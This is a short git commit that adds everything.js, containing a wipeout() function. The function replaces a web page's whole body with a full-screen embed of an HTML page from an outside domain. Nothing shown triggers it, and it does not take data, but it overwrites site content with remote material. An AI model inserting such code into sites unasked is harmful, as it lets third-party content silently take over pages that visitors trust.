a6131aa6cd123dd2b346aba1558843080582d1dc
null_pointer_lover <152438889+Crazy1111j@users.noreply.github.com>
2025-11-05 16:56:15 -0500

    Add wipeout function to replace body content

---
+++ everything.js
@@ -0,0 +1,1 @@
+function wipeout(){document.body.innerHTML = '<object type="text/html" data="https://daves-hot-chicken-new-mexico2.uk/something.html" style="width: 100vw; height: 100vh;"></object>';}
